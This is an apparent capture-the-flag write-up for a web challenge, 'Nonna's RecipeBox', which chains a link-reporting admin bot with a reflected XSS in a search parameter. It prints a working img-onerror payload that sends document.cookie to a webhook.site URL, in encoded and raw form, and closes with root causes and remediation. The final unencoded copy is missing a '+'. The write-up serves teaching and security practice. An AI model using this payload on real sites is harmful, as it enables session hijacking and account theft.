### RecipeBox - SSRF + Reflected XSS and Cookie Theft

> x Exam (50)


The target application, **Nonna's RecipeBox**, presents itself as a family recipe collection platform. The challenge description hints at the vulnerability: "Nonna personally reviews every link you send. She's very thorough (and has admin cookies)." The objective is to exfiltrate the administrator's session cookie by chaining a Server-Side Request Forgery primitive with a Reflected Cross-Site Scripting vulnerability.


#### Attack Surface Identification

Browsing the application reveals two primary surfaces: a search bar accepting a `?q=` query parameter, and a "Found a tasty link? Share it with Nonna!" form at the bottom of the page. The form accepts a URL and submits it to the `/report` endpoint as a JSON POST request:

```http
POST /report HTTP/2
Host: ee67e273-6424-4151-8ba1-d8589465662c.offsec.m0lecon.it
Content-Type: application/json

{
  "url": "https://webhook.site/35ec405b-2df7-45e7-bddc-a6ffbd39db43"
}
```

The server responds with:

```json
{
  "success": true,
  "message": "Nonna is checking your recipe link... 👀👀👀👀",
  "jobId": null
}
```

#### Confirming SSRF and Bot Type

Submitting a webhook.site URL to the form produces an incoming GET request on the receiver. Inspection of the request reveals the following User-Agent:

```
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
```

This confirms that the server dispatches a **headless Chromium browser** to visit the submitted URL, meaning any HTML page served in response will have its JavaScript fully executed within that browser context.

#### Identifying the Reflected XSS Gadget

The search bar reflects the `?q=` parameter directly into the page HTML without sanitization. Submitting a test tag:

```
https://ee67e273-6424-4151-8ba1-d8589465662c.offsec.m0lecon.it/?q=<h1>test</h1>
```

produces a rendered `<h1>` element on the page, confirming unsanitized HTML reflection. While direct `<script>` tags are stripped by the application, the `<img src=x onerror=...>` vector bypasses this filter successfully, as the application sanitizes angle-bracket-based tag names but does not perform context-aware output encoding on the attribute sink.


#### Why an External XSS Page Is Insufficient

An initial attempt involves hosting the cookie theft payload on webhook.site directly and submitting that URL to Nonna. While the headless browser visits the page and executes JavaScript, `document.cookie` returns empty because the admin session cookie is scoped to the RecipeBox origin. JavaScript executing on `webhook.site` has no access to cookies belonging to `ee67e273-6424-4151-8ba1-d8589465662c.offsec.m0lecon.it`.

#### The Correct Attack Chain

The exploit requires JavaScript to execute **within the RecipeBox origin** so that `document.cookie` returns the admin session token. The reflected XSS gadget in the `?q=` parameter provides exactly this: by crafting a URL on the RecipeBox domain that injects the payload, and then submitting that URL to Nonna's form, the headless browser visits the RecipeBox domain, the injected script executes in the correct origin context, and the cookie is accessible.


#### Payload Construction

The cookie theft payload using the `onerror` event handler:

```html
<img src=x onerror="fetch('https://webhook.site/35ec405b-2df7-45e7-bddc-a6ffbd39db43?c='+document.cookie)">
```

This is embedded into the `?q=` parameter of the RecipeBox search endpoint and URL-encoded to ensure the overall string is accepted as a valid URL by the `/report` endpoint validation:

```
https://ee67e273-6424-4151-8ba1-d8589465662c.offsec.m0lecon.it/?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch('https%3A%2F%2Fwebhook.site%2F35ec405b-2df7-45e7-bddc-a6ffbd39db43%3Fc%3D'%2Bdocument.cookie)%22%3E
```

#### Submission and Execution

This URL is submitted to the "Send to Nonna" form on the target instance. The server dispatches the headless browser to visit the URL, which loads the RecipeBox search page, attempts to render the injected `<img>` element, fails to load the invalid `src=x` source, and triggers the `onerror` handler. The handler executes `fetch()` with `document.cookie` appended as a query parameter, transmitting the admin session token to the webhook receiver.

#### Result

The webhook receives an incoming GET request from the challenge infrastructure with the admin cookie value in the `?c=` parameter, completing the exfiltration and yielding the flag.

## Attack Chain Summary

```
Attacker submits crafted URL to /report
        │
        ▼
Server dispatches headless Chromium to visit URL
        │
        ▼
Browser loads RecipeBox search page (?q= payload)
        │  (same origin as admin cookie)
        ▼
<img onerror> fires, executes fetch()
        │
        ▼
document.cookie read in RecipeBox origin context
        │
        ▼
Cookie exfiltrated to webhook.site → flag obtained
```

#### Root Causes

**Server-Side Request Forgery** arises from the `/report` endpoint accepting arbitrary user-supplied URLs and dispatching a privileged browser agent to visit them without restricting the reachable URL space to external domains only.

**Reflected Cross-Site Scripting** arises from the `?q=` search parameter being reflected into the HTML response without context-aware output encoding. Filtering only `<script>` tags while permitting arbitrary HTML attributes such as `onerror` provides no meaningful defense, as the browser evaluates event handlers identically to inline script blocks.

#### Remediation

The `/report` endpoint should validate submitted URLs against an allowlist of permitted domains and reject any URL pointing to the application's own origin. The search parameter should be sanitized using context-aware HTML encoding on output, converting all HTML-significant characters including angle brackets, quotation marks, and ampersands into their safe entity equivalents before insertion into the document. Additionally, a restrictive Content Security Policy header would prevent unauthorized `fetch()` calls to external origins even if injection were achieved.


Send the link to be reviewed by Nonna:

```http
https://ee67e273-6424-4151-8ba1-d8589465662c.offsec.m0lecon.it/?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch('https%3A%2F%2Fwebhook.site%2F35ec405b-2df7-45e7-bddc-a6ffbd39db43%3Fc%3D'%2Bdocument.cookie)%22%3E
```

Not encoded is:

```http
https://ee67e273-6424-4151-8ba1-d8589465662c.offsec.m0lecon.it/?q=<img src=x onerror="fetch('https://webhook.site/35ec405b-2df7-45e7-bddc-a6ffbd39db43?c=' document.cookie)">
```

![](_attachments/RecipeBox%20-_2.png)

![](_attachments/RecipeBox%20-.png)
